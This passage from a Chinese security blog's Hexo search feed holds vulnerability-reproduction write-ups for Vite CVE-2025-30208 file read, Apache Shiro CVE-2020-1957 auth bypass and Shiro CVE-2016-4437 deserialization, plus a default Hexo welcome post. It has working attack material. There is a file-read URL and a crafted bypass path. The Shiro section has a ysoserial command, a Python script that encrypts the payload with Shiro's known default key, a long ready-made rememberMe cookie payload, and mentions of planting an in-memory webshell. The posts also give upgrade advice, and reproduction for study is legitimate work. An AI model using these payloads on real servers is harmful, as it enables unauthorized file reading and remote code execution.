href="http://localhost:5173/@fs/C://windows/win.ini?import&raw??">localhost:5173&#x2F;@fs&#x2F;C:&#x2F;&#x2F;windows&#x2F;win.ini?import&amp;raw??</a></p><p><img src="/images/image-20250328090245447.png" alt="image-20250328090245447"></p><h3 id="执行修复命令"><a href="#执行修复命令" class="headerlink" title="执行修复命令"></a>执行修复命令</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">npm</span> install vite@<span class="hljs-number">6</span>.<span class="hljs-number">2</span>.<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>修复后：<img src="/images/image-20250328094258812.png" alt="image-20250328094258812"></p><p>参考文章</p><p><a href="https://blog.csdn.net/misu6/article/details/146573012">Vite 任意文件读取漏洞分析复现 CVE-2025-30208-CSDN博客</a></p><p><a href="https://mp.weixin.qq.com/s/BsjllB8_K9gh4u1QfkMTsw">Vite任意文件读取漏洞复现（CVE-2025-30208）</a></p><p><a href="https://www.panziye.com/front/16376.html">Vite存在CVE-2025-30208安全漏洞（附修复方案和演示示例） _ 潘子夜个人博客</a></p><p><a href="https://blog.csdn.net/misu6/article/details/146573012">Vite 任意文件读取漏洞分析复现 CVE-2025-30208-CSDN博客</a></p><p><a href="https://www.xaitx.com/tech/2025-03-26.html">Vite 任意文件读取漏洞分析复现（CVE-2025-30208） | 小艾博客</a></p><p><a href="https://www.ctfiot.com/233845.html">复现与修复指南：Vite任意文件读取漏洞（CVE-2025-30208） | CTF导航</a></p><p><a href="https://blog.nsfocus.net/cve-2025-30208/">Vite任意文件读取漏洞 (CVE-2025-30208) – 绿盟科技技术博客</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vite</tag>
      
      <tag>文件读取</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro认证绕过CVE-2020-1957</title>
    <link href="/2025/03/26/Shiro%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87CVE-2020-1957/"/>
    <url>/2025/03/26/Shiro%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87CVE-2020-1957/</url>
    
    <content type="html"><![CDATA[<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h3 id="Shiro拦截器"><a href="#Shiro拦截器" class="headerlink" title="Shiro拦截器"></a>Shiro拦截器</h3><p>Shiro框架通过拦截器功能来实现对用户访问权限的控制和拦截。Shiro中常见的拦截器有anon,authc等拦截器。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">1.anon为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口<br><br>2.authc为登录拦截器，需要登录认证才能访问的资源。<br></code></pre></td></tr></table></figure><p>用户可以在Shiro.ini编写匹配URL配置，将会拦截匹配的URL，并执行响应的拦截器。从而实现对URL的访问控制，URL路径表达式通常为ANT格式。如下配置，访问 &#x2F;index.html主页的时候，Shiro将不会对其进行登录判断，anon拦截器不需要登录就能进行访问。而对于&#x2F;user&#x2F;xiaoming 等 &#x2F;user&#x2F;xiaogang等接口，authc拦截器将会对其进行登录判断，有登录认证才能访问资源。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">[urls]<br>/index.html <span class="hljs-operator">=</span> anon<br>/user/** <span class="hljs-operator">=</span> authc<br></code></pre></td></tr></table></figure><p>Shiro的URL路径表达式为Ant 格式，路径通配符支持?***</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">?：匹配一个字符<br><span class="hljs-comment">*：匹配零个或多个字符串</span><br><span class="hljs-comment">**：匹配路径中的零个或多个路径</span><br></code></pre></td></tr></table></figure><p>这里粗略解释一下，当路径为&#x2F;xxx&#x2F;..和拦截规则里的&#x2F;xxx&#x2F;**匹配成功，通过校验，成功转向后方的Spring Boot . 从而进行了绕过</p><p>其中*表示匹配零个或多个字符串，&#x2F;<em>可以匹配&#x2F;hello，但匹配不到&#x2F;hello&#x2F;因为</em>通配符无法匹配路径。假设&#x2F;hello接口设置了authc拦截器，访问&#x2F;hello将会被进行权限判断，如果请求的URI为&#x2F;hello&#x2F;呢，&#x2F;*URL路径表达式将无法正确匹配，放行。然后进入到spring(Servlet)拦截器，spring中&#x2F;hello形式和&#x2F;hello&#x2F;形式的URL访问的资源是一样的。</p><h2 id="本实验环境-使用docker完成复现，公网"><a href="#本实验环境-使用docker完成复现，公网" class="headerlink" title="本实验环境 使用docker完成复现，公网"></a>本实验环境 使用docker完成复现，公网</h2><p>这个应用中对URL权限的配置如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> ShiroFilterChainDefinition <span class="hljs-title function_">shiroFilterChainDefinition</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">DefaultShiroFilterChainDefinition</span> <span class="hljs-variable">chainDefinition</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultShiroFilterChainDefinition</span>();<br>    chainDefinition.addPathDefinition(<span class="hljs-string">&quot;/login.html&quot;</span>, <span class="hljs-string">&quot;authc&quot;</span>); <span class="hljs-comment">// need to accept POSTs from the login form</span><br>    chainDefinition.addPathDefinition(<span class="hljs-string">&quot;/logout&quot;</span>, <span class="hljs-string">&quot;logout&quot;</span>);<br>    chainDefinition.addPathDefinition(<span class="hljs-string">&quot;/admin/**&quot;</span>, <span class="hljs-string">&quot;authc&quot;</span>);<br>    <span class="hljs-keyword">return</span> chainDefinition;<br>&#125;<br></code></pre></td></tr></table></figure><p>1.访问环境8080端口</p><p><img src="/images/image-20250326154808543.png" alt="image-20250326154808543"></p><p>2.当访问地址&#x2F;admin&#x2F;会被重定向到login.php</p><p><img src="/images/image-20250326154940212.png" alt="image-20250326154940212"></p><p><img src="/images/image-20250326155227524.png" alt="image-20250326155227524"></p><p>3.构造恶意请求&#x2F;xxx&#x2F;..;&#x2F;admin&#x2F; ，绕过权限校验，到达管理员界面</p><p><img src="/images/image-20250326155755134.png" alt="image-20250326155755134"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce#diff-98f7bc5c0391389e56531f8b3754081aR139">https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce#diff-98f7bc5c0391389e56531f8b3754081aR139</a></p><p>升级1.5.2版本及以上</p><p>修改了requestURI的获取方式，经过更准确的解析获取</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/vuls/231909.html">https://www.freebuf.com/vuls/231909.html</a></p><p><a href="https://xz.aliyun.com/news/7876?time__1311=Yqjx0DuDgiuDlOzG7DyDAOAWuboToD&u_atoken=0428e47a997e4a01d1ccb7c1af771093&u_asig=0a47314717429912626914864e0099">https://xz.aliyun.com/news/7876?time__1311=Yqjx0DuDgiuDlOzG7DyDAOAWuboToD&amp;u_atoken=0428e47a997e4a01d1ccb7c1af771093&amp;u_asig=0a47314717429912626914864e0099</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shiro</tag>
      
      <tag>拦截器绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro-CVE-2016-4437</title>
    <link href="/2025/03/25/Shiro-%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2CVE-2016-4437/"/>
    <url>/2025/03/25/Shiro-%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2CVE-2016-4437/</url>
    
    <content type="html"><![CDATA[<h3 id="Shiro-CVE-2016-4437"><a href="#Shiro-CVE-2016-4437" class="headerlink" title="Shiro-CVE-2016-4437"></a>Shiro-CVE-2016-4437</h3><p>1.目标加入随意字符提交后 bp中带有：Set-Cookie: rememberMe&#x3D;deleteMe字段<img src="/images/image-20250306101153831.png" alt="image-20250306101153831"></p><p>2.ysoserial 生成</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial-all.<span class="hljs-keyword">jar </span>CommonsBeanutils1 <span class="hljs-string">&quot;touch /desktop&quot;</span> &gt; poc.ser<br></code></pre></td></tr></table></figure><p>生成payload的py文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_rememberme</span>():<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;poc.ser&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(key, AES.MODE_CBC, iv)<br>    file_body = pad(f.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br> <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = encode_rememberme()   <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode()))<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rememberMe=atvw7IWDT663MDSftXLkGwRlhRivt+IkfHZ3HuZY1c6wgYaljM<span class="hljs-regexp">/kGC4kgtIoW5pZYpMIt/</span>Kl<span class="hljs-regexp">/Rcgr8PPhwwr5KzSKSq+re8fRyR5AN/</span>XqsCyCcQtxMxrkuWsEld3Ps0NUgTPGTW5xrt6UxtTmxFQzNS2OhIPIQYUpfPIA0vZsLQn7IJ0yeAbEHG5<span class="hljs-regexp">/Kq0Nk9YBehKtsWDNyTEG/</span>hH0d<span class="hljs-regexp">/gXDxxYa6g9MJ3BrpXOSZ3Up48g2i5JfNAfqkSTUMG7EAYw+yaD5ISmnGXvM6jFcLMqcOlGEnwtlky/</span>n2Du6Se+Rxlp4ZJqRB90xMb1I7OQBWDFnEDeKQ7ErCp2jaiw2mqnBv+nK5Wukh4rq6N0NIyehzWg<span class="hljs-regexp">/pUG+8zwgPJrlLFYmqqnX5f3o9/y</span>4M1Nct0GbF0K4zY4VJgHBZDRTTdZOEMgPvpDcupF3ueTht5ERSN79TZWUxr56Pj7<span class="hljs-regexp">/M4WcG/</span>T5wAsOXylq+fJv9orKCS2tUUPeRrnt7eTEq6CqfJgF3aaZq0dkLx5wQEOM2+<span class="hljs-number">89</span>uN87bBBm77I7PLxc3gPckPdQYGvM6gW7nTc6PwsxBQncDwaAbz3EkAL9APlwQ9ZkW5xm3DjY8eYhnkNZXIKM14CiFjv9MZsRHx6x9Vtzdaf52q<span class="hljs-regexp">/xC+MpKczzP41e94YwsjfihH+LHiv8OjGm3Qef+qhO/</span>llkszNrxwaLGYATlm68tNe36SXi5FWqyZUCpNppN4LZwnvDRL4XxEwZSEZ+FwLB9h7OJAW6DTSZbfJqVDcYL8arCwVh4DfI4hqTSoIscP37ZpXJ6P6TtHxu7psg2zxDMR7gMCX01kIdHSHNCeh1LiZIyEd4oqRbEZMoQMnOxrrW1IC5qKq0HERkMX3Exw5GcgQPqnA<span class="hljs-regexp">/bMqp3G6ymejtAV1e2o8qsZe+qALVx1s8k7Esw/i</span>oNBFFCf4XJZk5EInxF90ewUiLe6hRhyMYmyAP9qnKL8Dutbse<span class="hljs-regexp">/YErEP7bdQBRw7J8Nx95iXuahxlM1WMX4TxAeFwOF28sdWvz9drUZoop7CtGkIQ1pJrWFE1BId91KJECchZHoyoSodU5jqxLRJTF9fCn+ltc6pige0DhmT1BFvpZAFg0hb4/</span>YLOHYj4PKheCAVfeimHEhBx8B0q8uo87VP9KPmajgwopqRHv3UGYIqVK1fAj3t<span class="hljs-regexp">/jdrUcU1Fu7wwHjadeayi2MsA7KW4rrinWcY0ZXjtvGUk7vMYAWQt8l+tp3cPAkbk/g</span>8Jwhv66d4ThICGwp94ZoRE7yrRE2wFHU58C+hD2nPtw1bWK2RygIB82bRUzMepyFdK8KaOEm<span class="hljs-regexp">/jALF9zrmqlhX1NZpI0smX7xxqpijRq6XB/</span>YA04cxyNxFSuPXRy6iSlSlirktiG8e5rJ4zTka+U0eVU<span class="hljs-regexp">/h4SJAGuaDUc+RZKcTxE3U/</span><span class="hljs-number">7</span>rNVjL0jI556zfGLKLKEtLQ+VyleSiHP8Ony9tie4oQmOT3i4x0MJTUsrGJKC63DKN6uM+F+HwjGUIUTNkF0LvIOj3xlEj4vKTtjI+oe+<span class="hljs-number">0</span>OInPIRACXl0cBbsE0bDLq7hpJlJeBmodM9NrsJWBeBYIKOU8TsIAFihzoGb<span class="hljs-regexp">/7/</span>UQFdfpuLANKrrF7Ly1XZrJMkPbPIX0zAhmEqxAMYf8zaCeJfYh9UnBFFe2piyd2FAI23W8Xm4PZ<span class="hljs-regexp">/X+DlbSbc2GmCQw+YaLwnRTRtRD7OHAiv9rSh2EHrTcjKVL+HYVczJ7xZjJTHC/i</span>KNLlaIFFR8DdVTx+dHq954EljSpWAb36IJyqmfR7b3pLJDxm4UfU7YbBDrceTpBNKFsUP1U+cIf5w+ZRthmrK7+R+THOH0pdEKLithObP0YVXqN9o6dpTl36Wz93dnAjAjnpTtKKJZlHR1mHPFUxhyNejHLkh6Rb7p99MA1ts9UrCJqufDPJAKy<span class="hljs-regexp">/VbNXW1tHkNHpS15xLmhpid4mvWw3UnBHyTYl7MDuYguWc25vwFm0P4ptHfyFkRMZBmSRFwNfL7GzuT3b0KshSVrYKh3g/</span>hMPZdjctu73jJbdQs5Pn+<span class="hljs-number">9</span>EI8WaobZ831WNxneDIAYj8Yc8WeD1BmKoGSkFVXtYzuAcr5FpIpgjnVmcxH+ZoOldL5YnClZ9jQ9a2n3AJQIiDwstyV8etQWmjtRAhl6OZvYJnUgVzxh8x2tYh2DumEvEQN1YjOiTjZOnh+a7cJHwpPNmpo7s4UH+<span class="hljs-regexp">/rMl7JyDONAsf1pr0u+YTXxXr5rS8WVfb9QS61IJB4xqttn0TAifUzzwcFpg4+QS+WpaKOwwQtV68+ph5k8wh8rNfC2VE5qdXHiUsPquDCuU7zzZyWXPZq/y</span>hH1Nwoe1Ri7ZL3hsJOikW<span class="hljs-regexp">/y+C7TaeIPnCSiuHaO/</span>P8IVSwdeqEMEhMNmGRAlKxdmFuSloeQXJ8g<span class="hljs-regexp">/+YmwhS+lWxsIOyypbyxF6MEyT4XG4MQBrHyqWaKO63ktlDP5oln7Wg1JQdQAzR1dzm2t4ZeOmKkulRjBHbBz96RPXdjq45vpg2CR2KFg7YG02n0DPrxs3KqZUQ6WnWfOhQVfg02SZw+WpjxvwjpXou/</span>KMX4y8aoGUPI0fxmrz0dzS51MIzk2tIfrmpWIruZcgTIl3N6qplVYReEA<span class="hljs-regexp">/rhqK5dSLPIvVpKSLYl/</span>e+K6FS8tQzIKV<span class="hljs-regexp">/+j3RXmQF5aSct8ALwOgyAwUtfZAK2Rro7b+sGriqzvdPj6+DmM0rHOTixO4h1uJA7WEzp8LDVQrifZcqdSUHKWwSKlay2qKj6nwd3M2snwEiPT0hXKmNjdDYAnmSAdmx2bdoK3TcPjyHtJdpJeaThliVWP/</span>sJUZlE2bcysdwuq<span class="hljs-regexp">/JUiORWKEm1qyElKJYZiSLKLojhWRX0wUu0QYNjOhK+fvXl75C/</span>eSNi7xHUWDGdfBIDvvgToNSywRN0ql9hQGJ<span class="hljs-regexp">/HcKmnDbYb/</span>CCRmPWdBeMs8tAP9L8aSp0EGHKgwXtT8x54eUdJ3nn<span class="hljs-regexp">/zGl7N+Dbn8JmDu5F/</span>KrNLHuOgB7m<span class="hljs-regexp">/jBXj/</span>Z<span class="hljs-regexp">/w+mydEo7cvwmhAZtf51eY6qEpmjtgPwuhm7PVKL10Laa37j4SE0rnP+D0+6tj2mgd7P90zV5VGpaiwgg+yT5Mr8dKipKLuef9Gd02xopfSLihtloU36MvLgmtNg5C2rsKu/</span>ZZFSVHYrKfHYQNLmLugxfquGJ0Sdu<span class="hljs-regexp">/h/</span><span class="hljs-number">74</span>oRlCClWoV+rNwLahkrlHjTMl0bfbvCnrvGK17r7m9XI19wGDs7fBo+y9UXNBIXrMTnbyhpKrsTqBOYcEANDWCOcSc9XauJgci<span class="hljs-regexp">//</span>RMlhDPwALStugCGBTj+<span class="hljs-number">9</span>vTsOrdcs6ybyXHctq8GxanFl57acLh1+<span class="hljs-number">55</span>IhKC8A05pXnqqoCBRdyT6O218<span class="hljs-regexp">/IqN/</span>+a+XKZgY2cf6TpmQn3BNs+m+HduMhLB338uCxuDLahxJ3<span class="hljs-regexp">/3zp2YSOn5uUymh4diSVW4SAV1Hjy+zSZwSbg5wnbN4v7R84/</span>Dk6MXUZd1ubi27uFsyjO066B3WQJN3bw<span class="hljs-regexp">/80FsuwFXqbvwJ7iaSgons6fKY2XCkH7aCfsM4A0MZDVx+GO6VM+X5j8l9IjE7w0PlLF/</span>zX9kMr0ocdr/EXNfDaE2TPSNwZDFhQjiTiht4huYswOb+Wa7iwkq0TUI7wB5qtq+qetfrODJhkQikuJaC1w18eMeRggm9slcshCLerKM3uZlXVVw7bXu+i4AI9au48+GqYbUnrtSnW+P0jfB0qBfhr1Jl3jbRI2FyfezYTbiIghK8oZ2KSVPwdooELG5mxSaIfAJ7s1+lOVoYxTscI2H4nh5if2nPHkFvM5odrKAaGgo1jg==<br></code></pre></td></tr></table></figure><p>3.在Cookie处填入payload!<img src="/images/image-20250306112846388.png" alt="image-20250306112846388"></p><p>4.shiro利用工具 权限为root</p><p><img src="/images/image-20250306115621653.png" alt="image-20250306115621653"></p><p>执行内存马</p><p><img src="/images/image-20250306120252462.png" alt="image-20250306120252462"></p><p>冰蝎连接上</p><p><img src="/images/image-20250306120324856.png" alt="image-20250306120324856"></p><p>5.漏洞修复</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.Shiro版本&gt;<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">4</span><br><span class="hljs-attribute">2</span>.修改密钥<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shiro</tag>
      
      <tag>默认密钥爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/03/11/hello-world/"/>
    <url>/2025/03/11/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
